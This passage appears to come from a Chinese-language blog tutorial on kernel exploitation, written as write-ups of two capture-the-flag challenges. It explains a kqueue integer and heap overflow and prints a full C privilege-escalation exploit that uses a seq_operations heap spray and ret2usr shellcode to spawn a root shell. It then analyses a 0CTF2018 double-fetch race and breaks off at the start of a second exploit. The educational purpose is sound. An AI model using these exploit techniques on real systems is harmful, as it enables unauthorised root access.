class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br><span class="hljs-comment">//如果我们按前面0xffffffff设置的话,拷贝循环是没进入的。这里的作用是拷贝kqueue_entry-&gt;data数据，长度也是我们自己定的request.data_size</span><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="四-err">四.err</h6><p>呃，其实这里err就printk一下，没有实质性作用，所以其实<strong>所有检测都是没用的</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>  printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="0x02漏洞利用">0x02漏洞利用</h4><h5 id="1-整型溢出">1.整型溢出</h5><p>因为32位的无符号整型<code>request.max_entries=0xffffffff+1=0</code>存在溢出，我们传入</p><p><code>0xffffffff</code>使其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得</p><p><code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p><h5 id="2-堆溢出-seq-operations结构体">2.堆溢出+seq-operations结构体</h5><p>如果填入0xffffffff的话在 save_kqueue_entries()中会分配0x18大小的object给queue-&gt;queue_size，内存会从<code>kmalloc-32</code>中取，选取一个同样从kmalloc-32中分配的结构体，可以是 <strong>seq-operations</strong>,当我们打开stat文件（可以为/proc/self/stat）会在内核空间分配一个<strong>seq-operations</strong>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们read这个stat文件会调用proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，就会调用start函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>所以我们要控制<strong>seq_operations-&gt;start</strong>指向我们的shllocde，在用read读取对应的stat文件触发即可</p><h5 id="3-堆喷射">3.堆喷射</h5><p><strong>堆喷射（heap spray）</strong>，多次分配相同的内存以确保我们能命中其中之一</p><p>在这题中我们要在内核空间喷射足够多的<code>seq_operations</code> 结构体</p><h5 id="4-ret2usr-ret2shellcode">4.ret2usr+ret2shellcode</h5><p>没开smep/smap,KPTI,本题可使用ret2usr,<strong>但是由于开启了kalsr，我们似乎并无法找到prepare_kernel_cred 和 commit_creds 的地址</strong></p><p>但是可以通过编写shellcode利用内核栈上的数据来获得内核基址去执行commit_creds(prepare_kernel_cred(NULL))，着陆回用户态</p><h4 id="0x03-Exploit">0x03 Exploit</h4><p><strong>分析一下这个exp：</strong></p><p>首先保存一下用户态的寄存器值，为后续返回用户态准备</p><p>接着打开/dev/kqueue这个设备，与kqueue.ko这个驱动来交互</p><p>create_kqueue我们定<code>request.max_entries=0xffffffff</code>，大小定为0x20个存shellcode的指针</p><p>edit_kqueue我们写入这0x20个shellcode的指针</p><p>我们堆喷射大量<code>seq_operations</code> 结构体，这里open了0x200次<code>/proc/self/stat</code>这个结构体</p><p>用save_kqueue变更长度从0x18-&gt;0x40,溢出了0x28，也就是5个shellcode指针到了内存外，我们堆喷后，大概率是为<code>seq_operations</code> 结构体分配的内存，我们覆盖了start指针为shellcode的指针</p><p>我们一次用read来触发，调用start指针，执行我们的shellcode</p><p><strong>shellcode功能：</strong></p><p>取栈上存的内核符号的地址，得出基址，rop出commit_creds(prepare_kernel_cred(NULL))，返回用户态，生成shell</p><p>（主要是如何调试出来要减的值，我现在还是不会。）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> root_rip;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12 ,[rsp+0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12 ,0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13 ,r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12 ,0x8c580;&quot;</span><br>        <span class="hljs-string">&quot;add r13 ,0x8c140;&quot;</span><br>        <span class="hljs-string">&quot;xor rdi ,rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br><br>    );<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries ,<span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xDEADC0DE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .entry_idx = entry_idx,<br>        .data =data,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xDAADEEEE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx=queue_idx,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xBADDCAFE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .max_entries=max_entries,<br>        .data_size =data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xB105BABE</span>,&amp;req);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span> *page;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br>    save_status();<br>    root_rip = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;open /dev/kqueue failed!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span> ;i&lt;<span class="hljs-number">0x20</span>;i++)<br>        data[i]=(<span class="hljs-type">size_t</span>) shellcode ;<br>    <br>    createQueue(<span class="hljs-number">0xffffffff</span>,<span class="hljs-number">0x20</span>*<span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,data);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x200</span>;i++)<br>        seq_fd[i]=open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">0x200</span> ;i++)<br>        read(seq_fd[i],data,<span class="hljs-number">1</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>成功提权<img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/06kernelheapoverflow.png" alt="06kernelheapoverflow"></p><h2 id="06-double-fetch">06.double fetch</h2><p>double fetch可以理解为两次或多次对同一个对象取值</p><p>例：内核对一个对象第一次取值进行合法性检测，第二次取值进行使用</p><p>我们可以在第一次取值后对值进行修改成恶意数据，在第二次使用时执行我们的恶意数据</p><blockquote><p>通过在 first fetch 与 second fetch 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code></p></blockquote><h3 id="0CTF2018-Final-baby-kernel">0CTF2018 Final-baby kernel</h3><p>几年前的题目就是亲切，现在题目都是什么妖魔鬼怪</p><h4 id="0x01程序分析-4">0x01程序分析</h4><p>而单进程的内核很难触发double fetch漏洞，因此需要在QEMU启动时设置好内核和进程数如</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-m 256M -smp 2,<span class="hljs-attribute">cores</span>=2,threads=1  \<br></code></pre></td></tr></table></figure><p>保护什么都没开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \<br>-cpu qemu64 \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p>载入了baby.ko驱动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod baby.ko<br>chmod 777 /dev/baby<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>baby.ko驱动里只定义了baby_ioctl，里面是这个函数</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684499630049.png" alt="1"></p><p><strong>分析一下它做了啥：</strong></p><p>如果选项0x6666会告诉我们题目给的flag的地址</p><p>如果选项0x1337,一开始会有三个检查</p><p><strong>前两个检查</strong>用了<code>_chk_range_not_ok</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_chk_range_not_ok函数</span><br><span class="hljs-type">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="hljs-type">unsigned</span> __int64 a3)<br>&#123;<br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// cf</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdi</span><br><br>  v3 = __CFADD__(a2, a1);<br>  v4 = a2 + a1;<br>  <span class="hljs-keyword">return</span> v3 || a3 &lt; v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里面的<code>__CFADD__</code>在ida的宏定义是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// carry flag of addition (x+y)</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span>&gt; int8 __CFADD__(T x, U y)<br>&#123;<br>  <span class="hljs-type">int</span> size = <span class="hljs-built_in">sizeof</span>(T) &gt; <span class="hljs-built_in">sizeof</span>(U) ? <span class="hljs-built_in">sizeof</span>(T) : <span class="hljs-built_in">sizeof</span>(U);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint8</span>(x) &gt; <span class="hljs-built_in">uint8</span>(x+y);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">2</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint16</span>(x) &gt; <span class="hljs-built_in">uint16</span>(x+y);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">4</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint32</span>(x) &gt; <span class="hljs-built_in">uint32</span>(x+y);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint64</span>(x) &gt; <span class="hljs-built_in">uint64</span>(x+y);<br>&#125;<br></code></pre></td></tr></table></figure><p>add 指令会影响 CF（产生进位/借位）和 OF（两数最高位相同，结果最高位改变）标志位，v3获得的就是两数相加的 CF 位，这里一般为0,所以可以不管这个</p><p>a3我们要输入的是结构，结构分析后发现是</p><p>也就是存flag_str的指针，和flag的长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><span class="hljs-type">char</span> * flag_str<br><span class="hljs-type">int</span> flag_len<br>&#125;<br></code></pre></td></tr></table></figure><p>总的来讲</p><p><strong>第一个检查</strong>判断我们输入的结构体是否在用户空间</p><p><strong>第二个检查</strong>判断我们输入的flag_str是否在用户空间</p><p><strong>第三个检查</strong>判断我们输入的flag_str的len是否等于题目给的flag的长度</p><p>所有检查通过后对逐个字符与题目给的flag进行比较，都比较成功了的话打印题目的flag</p><h4 id="0x02解法1：条件竞争">0x02解法1：条件竞争</h4><p>正常来讲我们用户态是无法使用内核态的指针</p><p>首先0x6666选项得到flag的地址</p><p>接着创建竞争线程，一直重复修改我们与内核交互的.flag_addr指针为内核flag的地址</p><p>原进程则一直通过0x1337选项与内核交互，由于条件竞争，检查通过原本buf在用户态的指针，再次使用该指针时，已经由于我们条件竞争指向了内核态的flag地址，程序就告诉了我们flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -lpthread -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> tidp;<br><span class="hljs-type">int</span> competetion_times=<span class="hljs-number">0x10</span>,status=<span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_addr;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x20</span>]=<span class="hljs-string">&quot;will be dropped&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> *flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag=&#123;.flag_addr=buf,.flag_len=<span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">competetionThread</span><span class="hljs-params">(<span class="hljs-type">void</span>  *arg)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(status)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;competetion_times;i++);<br>            flag.flag_addr=(<span class="hljs-type">char</span> *)real_addr;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span 